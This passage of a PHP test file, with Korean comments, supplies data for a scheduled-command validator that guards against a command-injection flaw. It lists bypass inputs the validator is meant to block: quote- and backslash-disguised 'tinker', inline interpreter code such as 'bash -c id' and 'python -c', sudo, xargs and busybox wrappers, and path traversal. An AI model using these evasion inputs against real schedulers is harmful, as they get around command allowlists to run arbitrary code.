            'inspire' => ['inspire'],
            'optimize:clear' => ['optimize:clear'],
            '값 있는 옵션' => ['queue:prune-batches --hours=48'],
            '옵션 2개' => ['queue:work --stop-when-empty --max-time=300'],
            'seo:warmup --layout' => ['seo:warmup --layout=home'],
        ];
    }

    /**
     * 무해하지만 허용목록에 없어 거부되어야 하는 artisan command 목록.
     *
     * @return array<string, array{string}>
     */
    public static function notAllowlistedArtisanCommandProvider(): array
    {
        return [
            'route:list — 정보 노출' => ['route:list'],
            'about — 환경 정보 노출' => ['about'],
            'queue:failed' => ['queue:failed'],
            'storage:link' => ['storage:link'],
            'schedule:list' => ['schedule:list'],
        ];
    }

    /**
     * 검증기와 Symfony 의 해석이 갈리는 command 목록.
     *
     * @return array<string, array{string, string}>
     */
    public static function parserDivergenceArtisanCommandProvider(): array
    {
        return [
            '큰따옴표 위장' => ['"tinker" --execute=1', 'tinker'],
            '작은따옴표 위장' => ["'tinker' --execute=1", 'tinker'],
            '백슬래시 위장' => ['tin\\ker --execute=1', 'tinker'],
            '선행 옵션으로 명령명 밀어내기' => ['--env=local tinker', 'tinker'],
            '선행 옵션 + 마이그레이션 체인' => ['--no-interaction migrate --path=/tmp/x --realpath', 'migrate'],
            '따옴표로 허용목록 위장' => ['"cache:clear" --execute=1', 'cache:clear'],
        ];
    }

    /**
     * 허용목록에 있으나 사용법이 거부되어야 하는 command 목록.
     *
     * @return array<string, array{string, string}>
     */
    public static function blockedOptionArtisanCommandProvider(): array
    {
        return [
            '미허용 옵션 (cache:clear --tags)' => ['cache:clear --tags=a', ScheduleCommandValidator::ARTISAN_REASON_OPTION],
            '워커 상주 (--daemon)' => ['queue:work --daemon', ScheduleCommandValidator::ARTISAN_REASON_OPTION],
            '안전장치 무력화 (--force)' => ['queue:work --force', ScheduleCommandValidator::ARTISAN_REASON_OPTION],
            '정의에 없는 옵션' => ['optimize:clear --whatever', ScheduleCommandValidator::ARTISAN_REASON_OPTION],
            '경로 지정 옵션 (model:prune --path)' => ['model:prune --path=/tmp/g7', ScheduleCommandValidator::ARTISAN_REASON_OPTION],
            '클래스 지정 옵션 (model:prune --model)' => ['model:prune --model=App\\\\Models\\\\User', ScheduleCommandValidator::ARTISAN_REASON_MALFORMED],
            '단축 옵션' => ['cache:clear -v', ScheduleCommandValidator::ARTISAN_REASON_MALFORMED],
            '위치 인자' => ['cache:clear redis', ScheduleCommandValidator::ARTISAN_REASON_ARGUMENT],
            '중복 옵션' => ['queue:work --tries=1 --tries=9', ScheduleCommandValidator::ARTISAN_REASON_MALFORMED],
            '옵션 구분자 단독' => ['cache:clear --', ScheduleCommandValidator::ARTISAN_REASON_MALFORMED],
        ];
    }

    // ========================================================================
    // Data Providers — Shell 인터프리터 정책 (KVE-2026-1653)
    // ========================================================================

    /**
     * 인터프리터 정책 테스트에서 화이트리스트에 등재하는 실행 파일 목록.
     *
     * 인터프리터·완전거부형을 **등재한 상태**로 판정해 "등재돼도 차단됨" 을 증명한다.
     *
     * @return array<int, string>
     */
    private static function interpreterBinaries(): array
    {
        return [
            'bash', 'sh', 'python', 'python3', 'php', 'node', 'perl', 'ruby',
            'env', 'awk', 'make', 'xargs', 'sudo', 'busybox', 'sed',
            'backup.sh',
        ];
    }

    /**
     * 인터프리터에 인라인 코드/명령을 넘기는 command 목록 (전부 차단).
     *
     * @return array<string, array{string}>
     */
    /**
     * 변형 표기 인터프리터로 인라인 코드/감싼 명령을 넘기는 command 목록 (전부 차단).
     *
     * @return array<string, array{0: string, 1: string, 2: string}>
     */
    public static function variantInterpreterShellCommandProvider(): array
    {
        return [
            'python.exe -c 코드 (Windows 확장자)' => [
                'python.exe -c import_os', 'python.exe', ScheduleCommandValidator::SHELL_REASON_INLINE_CODE,
            ],
            'python3.12 -c 코드 (버전 접미사)' => [
                'python3.12 -c import_os', 'python3.12', ScheduleCommandValidator::SHELL_REASON_INLINE_CODE,
            ],
            'php8.2 -r 코드 (버전 접미사)' => [
                'php8.2 -r phpinfo', 'php8.2', ScheduleCommandValidator::SHELL_REASON_INLINE_CODE,
            ],
            'powershell.exe -Command (Windows 확장자)' => [
                'powershell.exe -Command Get-Process', 'powershell.exe', ScheduleCommandValidator::SHELL_REASON_INLINE_CODE,
            ],
            'sudo.exe 감싼 명령 (거부형 + 확장자)' => [
                'sudo.exe /usr/bin/id', 'sudo.exe', ScheduleCommandValidator::SHELL_REASON_INTERPRETER,
            ],
        ];
    }

    public static function inlineCodeShellCommandProvider(): array
    {
        return [
            'bash -c id (본체)' => ['bash -c id'],
            'sh -c id' => ['sh -c id'],
            'python -c 코드' => ['python -c import_os'],
            'python3 -c 코드' => ['python3 -c import_os'],
            'php -r 코드' => ['php -r phpinfo'],
            'node -e 코드' => ['node -e process'],
            'perl -e 코드' => ['perl -e system'],
            'ruby -e 코드' => ['ruby -e exec'],
            'bash -x 스크립트 앞 옵션' => ['bash -x /app/x.sh'],
            'python -m 모듈' => ['python -m http'],
        ];
    }

    /**
     * 인터프리터 + 절대경로 스크립트 (전부 허용 — 범용 크론 회귀 가드).
     *
     * @return array<string, array{string}>
     */
    public static function interpreterScriptShellCommandProvider(): array
    {
        return [
            'python 스크립트' => ['python /app/job.py'],
            'python3 스크립트' => ['python3 /app/job.py'],
            'node 스크립트' => ['node /app/worker.js'],
            'php 스크립트' => ['php /app/legacy.php'],
            'bash 스크립트' => ['bash /app/deploy.sh'],
            'ruby 스크립트' => ['ruby /app/task.rb'],
            'perl 스크립트' => ['perl /app/task.pl'],
            '스크립트 + 인자' => ['python /app/job.py --daily --verbose'],
        ];
    }

    /**
     * 인터프리터 뒤 스크립트 자리가 artisan 인 command 목록 (전부 차단).
     *
     * @return array<string, array{string}>
     */
    public static function artisanBypassShellCommandProvider(): array
    {
        return [
            'php artisan tinker' => ['php artisan'],
            'php 절대경로 artisan' => ['php /var/www/html/artisan'],
        ];
    }

    /**
     * 완전 거부형 실행기 command 목록 (전부 차단, 메타문자 없음).
     *
     * @return array<string, array{string}>
     */
    public static function rejectBinaryShellCommandProvider(): array
    {
        return [
            'env bash' => ['env bash /app/x.sh'],
            'make -f' => ['make -f /tmp/Makefile'],
            'xargs' => ['xargs id'],
            'sudo' => ['sudo id'],
            'busybox' => ['busybox sh'],
            'sed -e' => ['sed -e s/a/b/ /tmp/input.txt'],
        ];
    }

    /**
     * 인터프리터 뒤 스크립트 경로 형태 위반 command 목록 (전부 차단).
     *
     * @return array<string, array{string}>
     */
    public static function scriptPathShellCommandProvider(): array
    {
        return [
            '상대경로 (python)' => ['python job.py'],
            '상대경로 (php ./)' => ['php ./x.php'],
            '트래버설' => ['php /app/../../tmp/x.php'],
            '해시 위장' => ['php /app/x.php#foo'],
        ];
    }

    /**
     * 스크립트 없이 인터프리터만 있는 command 목록 (전부 차단).
     *
     * @return array<string, array{string}>
     */
    public static function noScriptShellCommandProvider(): array
    {
        return [
            'bash 단독' => ['bash'],
            'python 단독' => ['python'],
        ];
    }

    /**
     * 인터프리터가 아닌 일반 스크립트 command 목록 (전부 허용 — 기존 계약 보존).
     *
     * @return array<string, array{string}>
     */
    public static function plainScriptShellCommandProvider(): array
    {
        return [
            '실행 파일 단독' => ['backup.sh'],
            '인자 포함' => ['backup.sh --full /var/data'],
            '절대경로 인자' => ['/usr/local/bin/backup.sh --full'],
            '하이픈 인자 (일반 스크립트는 제한 없음)' => ['backup.sh -C /var/data'],
        ];
    }
}
